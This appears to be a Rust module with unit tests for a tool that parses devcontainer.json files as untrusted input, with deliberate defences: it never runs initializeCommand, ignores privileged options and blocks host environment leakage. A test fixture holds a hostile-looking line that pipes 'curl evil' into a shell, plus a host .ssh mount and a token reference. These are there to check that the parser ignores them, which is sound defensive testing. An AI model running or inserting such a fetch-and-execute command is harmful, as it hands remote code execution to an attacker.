//! `.devcontainer/devcontainer.json` support (13 §9): the subset that configures a container
//! box — `image`, `build` (Dockerfile + context; built only when explicitly asked and the repo
//! is trusted), `remoteUser`/`containerUser`, lifecycle commands (`onCreateCommand`,
//! `updateContentCommand`, `postCreateCommand`; run inside the box only after repo trust),
//! `mounts`, `containerEnv`/`remoteEnv` and `workspaceFolder`.
//!
//! The file is repo-controlled, so it is treated as untrusted input:
//! - `initializeCommand` (runs on the *host* per the devcontainer spec) is never run.
//! - `runArgs`, `privileged`, `capAdd`, `securityOpt`, `features`, `forwardPorts` and
//!   `postStartCommand`/`postAttachCommand` are ignored with a warning.
//! - `${localEnv:…}` expands to an empty string (host env never flows into the box).
//! - Bind mounts are policed by the caller (only sources inside the checkout, trusted repos).

use std::path::{Path, PathBuf};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DevBuild {
    /// Absolute Dockerfile path.
    pub dockerfile: PathBuf,
    /// Absolute build context.
    pub context: PathBuf,
    pub args: Vec<(String, String)>,
    pub target: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DevCommand {
    /// A string: run with `/bin/sh -c`.
    Shell(String),
    /// An array: exec directly.
    Exec(Vec<String>),
}

impl DevCommand {
    /// As one shell script line.
    pub fn script(&self) -> String {
        match self {
            DevCommand::Shell(s) => s.clone(),
            DevCommand::Exec(v) => v
                .iter()
                .map(|a| crate::container::sh_quote(a))
                .collect::<Vec<_>>()
                .join(" "),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum MountKind {
    Bind,
    Volume,
    Tmpfs,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DevMount {
    pub kind: MountKind,
    pub source: String,
    pub target: String,
    pub read_only: bool,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct DevContainer {
    /// The file this came from.
    pub path: PathBuf,
    pub image: Option<String>,
    pub build: Option<DevBuild>,
    pub remote_user: Option<String>,
    pub container_user: Option<String>,
    /// `(name, command)` in run order: onCreate, updateContent, postCreate (object forms keep
    /// their keys as `postCreateCommand:<key>`).
    pub lifecycle: Vec<(String, DevCommand)>,
    pub mounts: Vec<DevMount>,
    pub container_env: Vec<(String, String)>,
    pub remote_env: Vec<(String, String)>,
    pub workspace_folder: Option<String>,
    pub warnings: Vec<String>,
}

impl DevContainer {
    /// The user processes run as: `remoteUser`, else `containerUser`.
    pub fn user(&self) -> Option<&str> {
        self.remote_user
            .as_deref()
            .or(self.container_user.as_deref())
    }
    /// Deterministic tag for a built image (`vibeke-devcontainer:<blake3-12>` of the Dockerfile
    /// path, its content and the build args).
    pub fn build_tag(&self) -> Option<String> {
        let b = self.build.as_ref()?;
        let mut h = blake3_lite::Hasher::default();
        h.update(b.dockerfile.to_string_lossy().as_bytes());
        h.update(&std::fs::read(&b.dockerfile).unwrap_or_default());
        h.update(b.context.to_string_lossy().as_bytes());
        for (k, v) in &b.args {
            h.update(k.as_bytes());
            h.update(v.as_bytes());
        }
        Some(format!("vibeke-devcontainer:{}", h.hex12()))
    }
    /// `<runtime> build …` argv for the devcontainer image (only run when explicitly requested
    /// and the repo is trusted).
    pub fn build_argv(&self, cli: &Path) -> Option<Vec<String>> {
        let b = self.build.as_ref()?;
        let mut v = vec![
            cli.to_string_lossy().into_owned(),
            "build".into(),
            "--file".into(),
            b.dockerfile.to_string_lossy().into_owned(),
            "--tag".into(),
            self.build_tag()?,
        ];
        for (k, val) in &b.args {
            v.extend(["--build-arg".into(), format!("{k}={val}")]);
        }
        if let Some(t) = &b.target {
            v.extend(["--target".into(), t.clone()]);
        }
        v.push(b.context.to_string_lossy().into_owned());
        Some(v)
    }
}

/// blake3 with length-prefixed fields, shortened to 12 hex chars.
mod blake3_lite {
    #[derive(Default)]
    pub struct Hasher(blake3::Hasher);
    impl Hasher {
        pub fn update(&mut self, b: &[u8]) {
            self.0.update(&(b.len() as u64).to_le_bytes());
            self.0.update(b);
        }
        pub fn hex12(&self) -> String {
            self.0.finalize().to_hex()[..12].to_string()
        }
    }
}

/// Strip `//` and `/* */` comments and trailing commas (JSONC → JSON), respecting strings.
pub fn strip_jsonc(s: &str) -> String {
    let b: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    let mut in_str = false;
    while i < b.len() {
        let c = b[i];
        if in_str {
            out.push(c);
            if c == '\\' && i + 1 < b.len() {
                out.push(b[i + 1]);
                i += 2;
                continue;
            }
            if c == '"' {
                in_str = false;
            }
            i += 1;
            continue;
        }
        match c {
            '"' => {
                in_str = true;
                out.push(c);
                i += 1;
            }
            '/' if b.get(i + 1) == Some(&'/') => {
                while i < b.len() && b[i] != '\n' {
                    i += 1;
                }
            }
            '/' if b.get(i + 1) == Some(&'*') => {
                i += 2;
                while i + 1 < b.len() && !(b[i] == '*' && b[i + 1] == '/') {
                    i += 1;
                }
                i += 2;
            }
            ',' => {
                // Drop a comma followed only by whitespace/comments and a closing bracket.
                let mut j = i + 1;
                loop {
                    while j < b.len() && b[j].is_whitespace() {
                        j += 1;
                    }
                    if b.get(j) == Some(&'/') && b.get(j + 1) == Some(&'/') {
                        while j < b.len() && b[j] != '\n' {
                            j += 1;
                        }
                        continue;
                    }
                    if b.get(j) == Some(&'/') && b.get(j + 1) == Some(&'*') {
                        j += 2;
                        while j + 1 < b.len() && !(b[j] == '*' && b[j + 1] == '/') {
                            j += 1;
                        }
                        j += 2;
                        continue;
                    }
                    break;
                }
                if !matches!(b.get(j), Some('}') | Some(']')) {
                    out.push(',');
                }
                i += 1;
            }
            _ => {
                out.push(c);
                i += 1;
            }
        }
    }
    out
}

/// Expand devcontainer variables. `${localEnv:…}` deliberately expands to nothing.
pub fn substitute(
    s: &str,
    local_ws: &Path,
    container_ws: &str,
    warnings: &mut Vec<String>,
) -> String {
    let base = |p: &str| {
        Path::new(p)
            .file_name()
            .map(|f| f.to_string_lossy().into_owned())
            .unwrap_or_default()
    };
    let local = local_ws.to_string_lossy().into_owned();
    let mut out = String::new();
    let mut rest = s;
    while let Some(i) = rest.find("${") {
        out.push_str(&rest[..i]);
        let Some(end) = rest[i..].find('}') else {
            out.push_str(&rest[i..]);
            return out;
        };
        let var = &rest[i + 2..i + end];
        match var {
            "localWorkspaceFolder" => out.push_str(&local),
            "localWorkspaceFolderBasename" => out.push_str(&base(&local)),
            "containerWorkspaceFolder" => out.push_str(container_ws),
            "containerWorkspaceFolderBasename" => out.push_str(&base(container_ws)),
            v if v.starts_with("localEnv:") => {
                warnings.push(format!(
                    "${{{v}}} expands to an empty string (host env never enters the box)"
                ));
            }
            // `${containerEnv:X}` is resolved by the shell inside the box.
            v if v.starts_with("containerEnv:") => {
                out.push_str(&format!("${{{}}}", v.trim_start_matches("containerEnv:")))
            }
            v => {
                warnings.push(format!("unknown variable ${{{v}}} left empty"));
            }
        }
        rest = &rest[i + end + 1..];
    }
    out.push_str(rest);
    out
}

fn command_of(v: &serde_json::Value) -> Option<DevCommand> {
    match v {
        serde_json::Value::String(s) if !s.trim().is_empty() => Some(DevCommand::Shell(s.clone())),
        serde_json::Value::Array(a) => {
            let v: Vec<String> = a
                .iter()
                .filter_map(|x| x.as_str().map(str::to_string))
                .collect();
            (!v.is_empty()).then_some(DevCommand::Exec(v))
        }
        _ => None,
    }
}

fn parse_mount(v: &serde_json::Value) -> Option<DevMount> {
    let (kind, source, target, ro) = match v {
        serde_json::Value::String(s) => {
            let mut kind = "bind".to_string();
            let (mut src, mut dst, mut ro) = (String::new(), String::new(), false);
            for part in s.split(',') {
                let (k, val) = part.split_once('=').unwrap_or((part, ""));
                match k.trim() {
                    "type" => kind = val.trim().to_string(),
                    "source" | "src" => src = val.trim().to_string(),
                    "target" | "destination" | "dst" => dst = val.trim().to_string(),
                    "readonly" | "ro" => ro = val.is_empty() || val.trim() == "true",
                    _ => {}
                }
            }
            (kind, src, dst, ro)
        }
        serde_json::Value::Object(o) => (
            o.get("type")
                .and_then(|x| x.as_str())
                .unwrap_or("bind")
                .to_string(),
            o.get("source")
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .to_string(),
            o.get("target")
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .to_string(),
            o.get("readonly").and_then(|x| x.as_bool()).unwrap_or(false),
        ),
        _ => return None,
    };
    let kind = match kind.as_str() {
        "bind" => MountKind::Bind,
        "volume" => MountKind::Volume,
        "tmpfs" => MountKind::Tmpfs,
        _ => return None,
    };
    if target.is_empty() || (kind != MountKind::Tmpfs && source.is_empty()) {
        return None;
    }
    Some(DevMount {
        kind,
        source,
        target,
        read_only: ro,
    })
}

fn env_of(
    v: Option<&serde_json::Value>,
    local_ws: &Path,
    cws: &str,
    w: &mut Vec<String>,
) -> Vec<(String, String)> {
    v.and_then(|x| x.as_object())
        .map(|o| {
            o.iter()
                .filter_map(|(k, v)| {
                    v.as_str()
                        .map(|s| (k.clone(), substitute(s, local_ws, cws, w)))
                })
                .collect()
        })
        .unwrap_or_default()
}

/// Parse devcontainer JSON(C). `file` is the json's path (relative `build` paths resolve
/// against its directory); `local_ws` is the host checkout.
pub fn parse(text: &str, file: &Path, local_ws: &Path) -> Result<DevContainer, String> {
    let v: serde_json::Value =
        serde_json::from_str(&strip_jsonc(text)).map_err(|e| format!("{}: {e}", file.display()))?;
    let o = v
        .as_object()
        .ok_or_else(|| format!("{}: not a JSON object", file.display()))?;
    let mut w = Vec::new();
    let str_of = |k: &str| o.get(k).and_then(|x| x.as_str()).map(str::to_string);
    let workspace_folder = str_of("workspaceFolder");
    let cws = workspace_folder
        .clone()
        .unwrap_or_else(|| crate::container::BOX_WORKSPACE.to_string());
    let dir = file.parent().unwrap_or(Path::new("."));
    let build = {
        let b = o.get("build").and_then(|x| x.as_object());
        let dockerfile = b
            .and_then(|b| b.get("dockerfile").or(b.get("dockerFile")))
            .and_then(|x| x.as_str())
            .map(str::to_string)
            .or_else(|| str_of("dockerFile"));
        dockerfile.map(|df| {
            let context = b
                .and_then(|b| b.get("context"))
                .and_then(|x| x.as_str())
                .map(str::to_string)
                .or_else(|| str_of("context"))
                .unwrap_or_else(|| ".".into());
            DevBuild {
                dockerfile: dir.join(df),
                context: dir.join(context),
                args: b
                    .and_then(|b| b.get("args"))
                    .and_then(|x| x.as_object())
                    .map(|a| {
                        a.iter()
                            .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                            .collect()
                    })
                    .unwrap_or_default(),
                target: b
                    .and_then(|b| b.get("target"))
                    .and_then(|x| x.as_str())
                    .map(str::to_string),
            }
        })
    };
    let mut lifecycle = Vec::new();
    for key in [
        "onCreateCommand",
        "updateContentCommand",
        "postCreateCommand",
    ] {
        match o.get(key) {
            Some(serde_json::Value::Object(m)) => {
                for (name, c) in m {
                    if let Some(c) = command_of(c) {
                        lifecycle.push((format!("{key}:{name}"), c));
                    }
                }
            }
            Some(c) => {
                if let Some(c) = command_of(c) {
                    lifecycle.push((key.to_string(), c));
                }
            }
            None => {}
        }
    }
    for key in [
        "initializeCommand",
        "runArgs",
        "privileged",
        "capAdd",
        "securityOpt",
        "features",
        "forwardPorts",
        "appPort",
        "postStartCommand",
        "postAttachCommand",
        "dockerComposeFile",
        "init",
    ] {
        if o.contains_key(key) {
            w.push(format!(
                "devcontainer `{key}` is not supported and was ignored"
            ));
        }
    }
    let mounts = o
        .get("mounts")
        .and_then(|x| x.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|m| {
                    let mut m = parse_mount(m)?;
                    m.source = substitute(&m.source, local_ws, &cws, &mut w);
                    m.target = substitute(&m.target, local_ws, &cws, &mut w);
                    Some(m)
                })
                .collect()
        })
        .unwrap_or_default();
    let container_env = env_of(o.get("containerEnv"), local_ws, &cws, &mut w);
    let remote_env = env_of(o.get("remoteEnv"), local_ws, &cws, &mut w);
    Ok(DevContainer {
        path: file.to_path_buf(),
        image: str_of("image"),
        build,
        remote_user: str_of("remoteUser"),
        container_user: str_of("containerUser"),
        lifecycle,
        mounts,
        container_env,
        remote_env,
        workspace_folder,
        warnings: w,
    })
}

/// Load `rel` (default `.devcontainer/devcontainer.json`, then `.devcontainer.json`) under
/// `checkout`. `Ok(None)` when there is none.
pub fn load(checkout: &Path, rel: Option<&str>) -> Result<Option<DevContainer>, String> {
    let candidates: Vec<PathBuf> = match rel {
        Some(r) => vec![checkout.join(r)],
        None => vec![
            checkout.join(".devcontainer/devcontainer.json"),
            checkout.join(".devcontainer.json"),
        ],
    };
    for f in candidates {
        // Never follow the file outside the checkout (a symlink to ~/.ssh/… would leak).
        let Ok(real) = f.canonicalize() else { continue };
        let root = checkout
            .canonicalize()
            .unwrap_or_else(|_| checkout.to_path_buf());
        if !real.starts_with(&root) {
            return Err(format!("{} points outside the repository", f.display()));
        }
        let text = std::fs::read_to_string(&real).map_err(|e| format!("{}: {e}", f.display()))?;
        return parse(&text, &f, checkout).map(Some);
    }
    if let Some(r) = rel {
        return Err(format!("{} not found", checkout.join(r).display()));
    }
    Ok(None)
}

/// Digest of the devcontainer file, for repo trust (09 §4): lifecycle commands only run when
/// the user trusted this exact content.
pub fn digest(dc: &DevContainer) -> String {
    blake3::hash(&std::fs::read(&dc.path).unwrap_or_default())
        .to_hex()
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE: &str = r#"
    // A typical devcontainer
    {
      "name": "node", /* inline */
      "build": { "dockerfile": "Dockerfile", "context": "..", "args": { "NODE": "22" }, },
      "remoteUser": "node",
      "workspaceFolder": "/workspaces/${localWorkspaceFolderBasename}",
      "postCreateCommand": "pnpm install // not a comment",
      "onCreateCommand": ["bash", "-c", "echo hi"],
      "mounts": [
        "source=vk-pnpm-store,target=/home/node/.pnpm-store,type=volume",
        { "type": "bind", "source": "${localEnv:HOME}/.ssh", "target": "/home/node/.ssh" },
        "source=${localWorkspaceFolder}/data,target=/data,type=bind,readonly"
      ],
      "containerEnv": { "FOO": "bar", "TOKEN": "${localEnv:GITHUB_TOKEN}" },
      "runArgs": ["--privileged"],
      "initializeCommand": "curl evil | sh",
      "features": { "ghcr.io/devcontainers/features/node:1": {} },
    }"#;

    #[test]
    fn parses_the_supported_subset() {
        let ws = Path::new("/repo/app");
        let dc = parse(
            SAMPLE,
            Path::new("/repo/app/.devcontainer/devcontainer.json"),
            ws,
        )
        .unwrap();
        assert_eq!(dc.image, None);
        let b = dc.build.as_ref().unwrap();
        assert_eq!(
            b.dockerfile,
            Path::new("/repo/app/.devcontainer/Dockerfile")
        );
        assert_eq!(b.context, Path::new("/repo/app/.devcontainer/.."));
        assert_eq!(b.args, [("NODE".to_string(), "22".to_string())]);
        assert_eq!(dc.user(), Some("node"));
        assert_eq!(
            dc.workspace_folder.as_deref(),
            Some("/workspaces/${localWorkspaceFolderBasename}")
        );
        assert_eq!(dc.lifecycle.len(), 2);
        assert_eq!(dc.lifecycle[0].0, "onCreateCommand");
        assert_eq!(dc.lifecycle[0].1.script(), "bash -c 'echo hi'");
        assert_eq!(
            dc.lifecycle[1].1,
            DevCommand::Shell("pnpm install // not a comment".into())
        );
        assert_eq!(dc.mounts.len(), 3);
        assert_eq!(dc.mounts[0].kind, MountKind::Volume);
        // ${localEnv:HOME} is never expanded.
        assert_eq!(dc.mounts[1].source, "/.ssh");
        assert_eq!(dc.mounts[2].source, "/repo/app/data");
        assert!(dc.mounts[2].read_only);
        assert_eq!(
            dc.container_env,
            [
                ("FOO".to_string(), "bar".to_string()),
                ("TOKEN".to_string(), String::new())
            ]
        );
        let w = dc.warnings.join("\n");
        for k in ["runArgs", "initializeCommand", "features", "localEnv:HOME"] {
            assert!(w.contains(k), "{k} missing from {w}");
        }
    }

    #[test]
    fn image_form_and_object_lifecycle() {
        let dc = parse(
            r#"{"image":"mcr.microsoft.com/devcontainers/base:ubuntu","postCreateCommand":{"a":"make deps","b":["npm","ci"]},"containerUser":"vscode"}"#,
            Path::new("/r/.devcontainer.json"),
            Path::new("/r"),
        )
        .unwrap();
        assert_eq!(
            dc.image.as_deref(),
            Some("mcr.microsoft.com/devcontainers/base:ubuntu")
        );
        assert_eq!(dc.user(), Some("vscode"));
        assert_eq!(
            dc.lifecycle
                .iter()
                .map(|(n, _)| n.as_str())
                .collect::<Vec<_>>(),
            ["postCreateCommand:a", "postCreateCommand:b"]
        );
        assert!(dc.build.is_none());
        assert!(dc.build_argv(Path::new("/usr/bin/docker")).is_none());
    }

    #[test]
    fn build_argv_and_stable_tag() {
        let t = tempfile::tempdir().unwrap();
        let d = t.path().join(".devcontainer");
        std::fs::create_dir_all(&d).unwrap();
        std::fs::write(d.join("Dockerfile"), "FROM alpine:3.20\n").unwrap();
        std::fs::write(
            d.join("devcontainer.json"),
            r#"{"build":{"dockerfile":"Dockerfile","target":"dev"}}"#,
        )
        .unwrap();
        let dc = load(t.path(), None).unwrap().unwrap();
        let a = dc.build_argv(Path::new("/usr/bin/docker")).unwrap();
        let tag = dc.build_tag().unwrap();
        assert!(tag.starts_with("vibeke-devcontainer:"));
        assert_eq!(a[1], "build");
        assert!(a.join(" ").contains(&format!("--tag {tag} --target dev")));
        assert_eq!(dc.build_tag().unwrap(), tag);
        std::fs::write(d.join("Dockerfile"), "FROM alpine:3.21\n").unwrap();
        assert_ne!(dc.build_tag().unwrap(), tag);
    }

    #[test]
    fn load_refuses_symlinks_out_of_the_repo() {
        let t = tempfile::tempdir().unwrap();
        let outside = t.path().join("outside.json");
        std::fs::write(&outside, "{}").unwrap();
        let repo = t.path().join("repo");
        std::fs::create_dir_all(repo.join(".devcontainer")).unwrap();
        std::os::unix::fs::symlink(&outside, repo.join(".devcontainer/devcontainer.json")).unwrap();
        assert!(load(&repo, None).is_err());
        assert_eq!(load(&t.path().join("none"), None).unwrap(), None);
        assert!(load(&repo, Some("missing.json")).is_err());
    }

    #[test]
    fn jsonc_edge_cases() {
        assert_eq!(
            strip_jsonc(r#"{"a":"//x", /*c*/ "b":[1,2,],}"#),
            r#"{"a":"//x",  "b":[1,2]}"#
        );
        assert_eq!(strip_jsonc(r#"{"a":"\"//"}"#), r#"{"a":"\"//"}"#);
        assert_eq!(strip_jsonc("[1, // c\n]"), "[1 \n]");
    }
}
